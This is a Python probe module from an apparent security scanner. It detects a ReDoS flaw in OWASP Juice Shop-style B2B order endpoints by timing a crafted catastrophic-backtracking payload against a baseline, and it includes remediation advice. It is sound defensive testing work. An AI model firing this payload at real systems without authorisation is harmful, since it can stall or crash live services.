#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Injection: catastrophic-backtracking ReDoS on B2B orderLinesData regex.

When the server validates `orderLinesData` with a JS regex that has
exponential backtracking on a crafted input — typical pattern is
`/^([\\w-]+)+$/` — a small payload (≤ 60 chars) blocks the event
loop for seconds. Production impact: a single concurrent request
takes the whole Node process out.

Detection signal:
  PATCH /b2b/v2/orders with a 50-character non-matching payload that
  triggers exponential backtracking in the validator → response
  time ≥ 1.5 s vs baseline < 300 ms.

Tested against:
  + OWASP Juice Shop  the orderLinesData validator is regex-based and
                      vulnerable → validated=True (when the b2b path
                      is reachable).
"""
from __future__ import annotations

import json
import sys
import time
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

B2B_PATHS = (
    "/b2b/v2/orders",
    "/api/b2b/orders",
)

# Catastrophic input: many alphanumerics followed by a single non-
# matching character. With a regex like /^([a-zA-Z]+)+$/, the engine
# tries every possible split before giving up.
PROBE_PAYLOAD  = "a" * 50 + "!"
THRESHOLD_DELTA_MS = 1500    # the bug class is loud — anything quieter is noise
BASELINE_PAYLOAD = "ok"


class RedosB2bOrderLinesProbe(Probe):
    name = "redos_b2b_orderlines"
    summary = ("Detects ReDoS in the B2B orderLinesData validator via "
               "a catastrophic-backtracking payload + timing.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--path", action="append", default=[],
            help="Additional B2B path to test (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = list(B2B_PATHS) + list(args.path or [])

        attempts: list[dict] = []
        confirmed: dict | None = None
        for p in paths:
            url = urljoin(origin, p)
            t0 = time.monotonic()
            r0 = client.request("PATCH", url, headers={
                "Content-Type": "application/json",
            }, body=json.dumps({"orderLinesData": BASELINE_PAYLOAD}).encode())
            baseline_ms = int((time.monotonic() - t0) * 1000)

            t1 = time.monotonic()
            r1 = client.request("PATCH", url, headers={
                "Content-Type": "application/json",
            }, body=json.dumps({"orderLinesData": PROBE_PAYLOAD}).encode())
            probe_ms = int((time.monotonic() - t1) * 1000)

            row = {"path": p, "baseline_ms": baseline_ms,
                   "probe_ms": probe_ms,
                   "delta_ms": probe_ms - baseline_ms,
                   "baseline_status": r0.status,
                   "probe_status":    r1.status,
                   "payload_chars":   len(PROBE_PAYLOAD),
                   "threshold_ms":    THRESHOLD_DELTA_MS}
            if (probe_ms - baseline_ms) >= THRESHOLD_DELTA_MS \
                    and probe_ms >= THRESHOLD_DELTA_MS:
                row["redos_confirmed"] = True
                confirmed = row
                attempts.append(row)
                break
            attempts.append(row)

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.9,
                summary=(f"Confirmed: ReDoS on {origin}{confirmed['path']}"
                         f" — {len(PROBE_PAYLOAD)}-char payload "
                         f"increased response time by "
                         f"{confirmed['delta_ms']} ms over baseline."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Replace the regex validator with a simple "
                    "explicit parser. JS regex engines are NFA-based "
                    "and fundamentally vulnerable to catastrophic-"
                    "backtracking patterns. Or run the regex in a "
                    "worker with a timeout; or use a safer engine like "
                    "RE2 (re2-wasm on Node). Pair with rate limits and "
                    "request-time SLOs that fail fast on slow handlers."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: {len(attempts)} ReDoS attempts on "
                     f"{origin}; no path showed a "
                     f"{THRESHOLD_DELTA_MS} ms slowdown."),
            evidence=evidence,
        )


if __name__ == "__main__":
    RedosB2bOrderLinesProbe().main()
